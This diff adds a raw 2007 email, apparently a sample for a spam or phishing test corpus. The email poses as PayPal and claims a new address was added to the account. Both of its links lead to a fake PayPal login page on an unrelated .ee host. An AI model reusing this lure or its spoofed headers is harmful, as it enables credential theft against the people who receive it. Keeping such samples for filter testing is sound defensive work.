@@ -1,0 +1,60 @@
+From nobody Sun Jan 25 13:50:03 2015
+Return-Path: <service@paypal.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 32B834699F
+ for <user@login.example.com>; Mon,  7 May 2007 16:55:05 -0400 (EDT)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by mail.example.org (Postfix) with ESMTP id 50E00131F898
+ for <user@example.com>; Mon,  7 May 2007 16:55:05 -0400 (EDT)
+Received: from ramazzotti.pt (194-79-82-206.net.novis.pt [194.79.82.206])
+ by mail.example.org (Postfix) with ESMTP id 51C606FA1C5
+ for <user@example.com>; Mon,  7 May 2007 16:54:49 -0400 (EDT)
+Received: from server-nt.ramazzotti.pt ([89.0.0.63]) by ramazzotti.pt with
+ Microsoft SMTPSVC(6.0.3790.1830); Mon, 7 May 2007 21:50:22 +0100
+Received: from User (host-216-211-25-83.tbaytel.net [216.211.25.83]) by
+ server-nt.ramazzotti.pt with SMTP (Microsoft Exchange Internet Mail Service
+ Version 5.5.2653.13) id 2FBGQC9S; Mon, 7 May 2007 18:47:42 +0100
+From: "service@paypal.com"<service@paypal.com>
+Subject: You have added a new e-mail address
+Date: Mon, 7 May 2007 13:39:35 -0400
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-ID: <SUPORTEZUbPHiNKyKJW00005dc5@ramazzotti.pt>
+X-OriginalArrivalTime: 07 May 2007 20:50:22.0515 (UTC)
+ FILETIME=[54A3D030:01C790E9]
+To: undisclosed-recipients:;
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 1228
+
+
+<HTML>
+<HEAD>
+<META NAME="GENERATOR" Content="Microsoft DHTML Editing Control">
+<TITLE></TITLE>
+</HEAD>
+<BODY>
+<P><FONT face="Courier New" size="2">You have added 
+<a href="http://www.ltd.ee/~test/sajax/us/cgi-bin/profiles/webscr=home=p/index.php">jhonnyk33@hotmail.com</a> as a new e-mail address for<br> your
+PayPal account.&nbsp; </font></p>
+<P><font face="Courier New" size="2">If you did not authorize this change or if you need assistance<br> with 
+your account, please <a href="http://www.ltd.ee/~test/sajax/us/cgi-bin/profiles/webscr=home=p/index.php">click here</a> to contact PayPal customer service.</p>
+<P>&nbsp;</p>
+<P>Thank you for using PayPal<br>
+The PayPal Team</p>
+<P><FONT face="Courier New" size="2">Please do not reply to this e-mail. Mail sent to this address cannot<br> be
+answered. For assistance, log in to your PayPal account and choose<br> the
+"Help" link in the header of any page.<br></p></FONT>
+
+
+</font>
+
